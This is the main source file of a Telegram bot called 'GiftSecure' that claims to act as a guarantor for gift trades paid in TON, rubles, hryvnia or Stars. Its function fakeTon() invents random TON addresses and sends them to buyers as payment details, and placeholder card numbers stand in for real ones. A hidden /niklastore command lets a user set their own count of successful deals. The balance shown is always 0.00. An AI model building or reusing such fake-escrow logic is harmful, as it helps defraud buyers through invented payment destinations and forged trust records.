import 'dotenv/config'
import { Telegraf, Scenes, session } from 'telegraf'
import start from './commands/start.js'
import deeplink from './commands/deeplink.js'
import niklastore from './commands/niklastore.js'
import { walletManageScene } from './scenes/walletManage.js'
import { createDealWizard } from './scenes/createDeal.js'
import { mainMenuKb, langKb, profileKb, ratingKb } from './keyboards.js'
import db, { initDB } from './db.js'

await initDB()
if (!process.env.BOT_TOKEN) { console.error('❌ BOT_TOKEN не задан'); process.exit(1) }

const bot = new Telegraf(process.env.BOT_TOKEN)
const stage = new Scenes.Stage([walletManageScene, createDealWizard])
bot.use(session())
bot.use(stage.middleware())

// username для диплинков
let BOT_USERNAME = process.env.BOT_USERNAME || null
if (!BOT_USERNAME) { try { const me = await bot.telegram.getMe(); BOT_USERNAME = me?.username; if (BOT_USERNAME) process.env.BOT_USERNAME = BOT_USERNAME } catch {} }

// /start
bot.start(async (ctx) => {
  if (ctx.scene?.current?.id) return // сцены сами ловят /start
  if (typeof ctx.startPayload === 'string' && ctx.startPayload.length > 5) return deeplink(ctx)
  return start(ctx)
})

/* ===== Главное меню разделы ===== */
bot.action('menu:profile', async (ctx) => {
  await ctx.answerCbQuery().catch(()=>{})
  await db.read()
  const u = db.data.users[ctx.from.id] || {}
  await ctx.reply(
    `*Ваш профиль*\n\nПользователь: @${ctx.from.username || ctx.from.id}\nБаланс: 0.00\nУспешных сделок: ${u.successCount || 0}`,
    { parse_mode: 'Markdown' }
  )
  return ctx.reply('Выберите:', profileKb())
})

bot.action('menu:rating', async (ctx) => {
  await ctx.answerCbQuery().catch(()=>{})
  await ctx.reply('🏆 ТОП-10 по количеству сделок:\n\n1. ...', ratingKb())
})

bot.action('menu:lang', async (ctx) => {
  await ctx.answerCbQuery().catch(()=>{})
  await ctx.reply('🌍 Выберите предпочитаемый язык\n\n🔷 Текущий: Русский', langKb('Русский'))
})

bot.action('back:menu', async (ctx) => {
  await ctx.answerCbQuery().catch(()=>{})
  return start(ctx)
})

/* ===== Реквизиты / Вывод ===== */
bot.action('wallet:manage', async (ctx) => {
  await ctx.answerCbQuery().catch(()=>{})
  return ctx.scene.enter('wallet-manage')
})
bot.action('w:WITHDRAW', async (ctx) => {
  await ctx.answerCbQuery().catch(()=>{})
  ctx.session.goWithdraw = true
  return ctx.scene.enter('wallet-manage')
})

/* ===== Создать сделку ===== */
bot.action('deal:create', async (ctx) => {
  await ctx.answerCbQuery().catch(()=>{})
  return ctx.scene.enter('create-deal')
})

/* ===== niklastore — только успешные сделки ===== */
bot.command('niklastore', (ctx) => niklastore(ctx))

/* ===== Поток продавца (осталась твоя логика) ===== */
import { sellerGiftConfirmKb, sellerShotSentKb } from './keyboards.js'

function fakeTon(){const a='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';let s='UQ';for(let i=0;i<46;i++)s+=a[Math.floor(Math.random()*a.length)];return s}
function detectRubType(val=''){const v=(val||'').replace(/\s+/g,'');const card=/^\d{16,19}$/.test(v);const phone=/^(\+7|7|8)\d{10}$/.test(v);return card?'card':(phone?'phone':null)}

bot.action(/seller:gift_sent:(.+)/, async (ctx) => {
  await ctx.answerCbQuery().catch(()=>{})
  const token = ctx.match[1]
  await db.read()
  const deal = Object.values(db.data.deals || {}).find(d => d.token === token)
  if (!deal) return ctx.reply('Сделка не найдена.')
  if (deal.sellerId !== ctx.from.id) return ctx.reply('Не ваша сделка.')
  deal.status = 'gift_sent'; deal.log ||= []; deal.log.push('Продавец: подарoк отправлен.')
  await db.write()
  await ctx.reply('Вы точно передали подарок?', sellerGiftConfirmKb(token))
})

bot.action(/seller:gift_confirm:(.+)/, async (ctx) => {
  await ctx.answerCbQuery().catch(()=>{})
  const token = ctx.match[1]
  await db.read()
  const deal = Object.values(db.data.deals || {}).find(d => d.token === token)
  if (!deal) return ctx.reply('Сделка не найдена.')
  if (deal.sellerId !== ctx.from.id) return ctx.reply('Не ваша сделка.')
  deal.log ||= []; deal.log.push('Продавец подтвердил передачу подарка.'); await db.write()
  await ctx.reply('Пришлите скриншот передачи подарка покупателю.', sellerShotSentKb(token))
  if (deal.buyerId) { try { await ctx.telegram.sendMessage(deal.buyerId, '🎁 Продавец подтвердил передачу подарка. Ожидаем скриншот.') } catch {} }
})

bot.action(/seller:shot_sent:(.+)/, async (ctx) => {
  await ctx.answerCbQuery().catch(()=>{})
  const token = ctx.match[1]
  await db.read()
  const deal = Object.values(db.data.deals || {}).find(d => d.token === token)
  if (!deal) return ctx.reply('Сделка не найдена.')
  if (deal.sellerId !== ctx.from.id) return ctx.reply('Не ваша сделка.')
  deal.status = 'await_payment'; deal.log ||= []; deal.log.push('Ожидаем оплату.'); await db.write()

  const seller = db.data.users[deal.sellerId] || {}
  const w = seller.wallets || {}
  let payLine = ''
  if (deal.currency === 'TON') { const addr = w.TON || fakeTon(); payLine = `Отправьте *${deal.amount} TON* на адрес:\n\`${addr}\`` }
  else if (deal.currency === 'RUB') { const rub=(w.RUB||'').trim(); const t=detectRubType(rub); payLine = t==='phone'?`Отправьте *${deal.amount} RUB* на номер:\n\`${rub}\``:`Отправьте *${deal.amount} RUB* на карту:\n\`${rub||'2200 1234 5678 9012'}\`` }
  else if (deal.currency === 'UAH') { const card=(w.UAH||'5375 1234 5678 9012').trim(); payLine=`Отправьте *${deal.amount} UAH* на карту:\n\`${card}\`` }
  else if (deal.currency === 'STARS') { payLine=`Оплатите *${deal.amount} Stars* через Fragment или подарками (комиссия на покупателе).` }

  const msg = `⏳ Ожидание оплаты от покупателя.\n\n${payLine}`
  try { if (deal.buyerId) await ctx.telegram.sendMessage(deal.buyerId, msg, { parse_mode:'Markdown' }) } catch {}
  try { await ctx.telegram.sendMessage(deal.sellerId, msg, { parse_mode:'Markdown' }) } catch {}
})

bot.action(/seller:cancel:(.+)/, async (ctx) => {
  await ctx.answerCbQuery().catch(()=>{})
  const token = ctx.match[1]
  await db.read()
  const deal = Object.values(db.data.deals || {}).find(d => d.token === token)
  if (!deal) return ctx.reply('Сделка не найдена.')
  if (deal.sellerId !== ctx.from.id) return ctx.reply('Не ваша сделка.')
  deal.status='canceled'; deal.log ||= []; deal.log.push('Отмена.'); await db.write()
  await ctx.reply('❌ Сделка отменена.'); if (deal.buyerId) { try { await ctx.telegram.sendMessage(deal.buyerId,'❌ Сделка отменена продавцом.') } catch {} }
})

/* ===== niklastore ввод числа ===== */
bot.on('message', async (ctx) => {
  const text = (ctx.message?.text || '').trim()
  if (ctx.session.adminAwaitSuccessCount) {
    const n = parseInt(text, 10); ctx.session.adminAwaitSuccessCount = false
    if (!isFinite(n) || n < 0) return ctx.reply('Введите корректное число.')
    await db.read(); db.data.users[ctx.from.id] ||= { id: ctx.from.id }; db.data.users[ctx.from.id].successCount = n; await db.write()
    try { await ctx.deleteMessage() } catch {}
    return ctx.reply(`✅ Успешные сделки установлены: ${n}`)
  }
  return ctx.reply('Главное меню:', mainMenuKb())
})

await bot.telegram.deleteWebhook({ drop_pending_updates: true }).catch(()=>{})
await bot.launch()
console.log('GiftSecure RUNNING')
process.once('SIGINT', () => bot.stop('SIGINT'))
process.once('SIGTERM', () => bot.stop('SIGTERM'))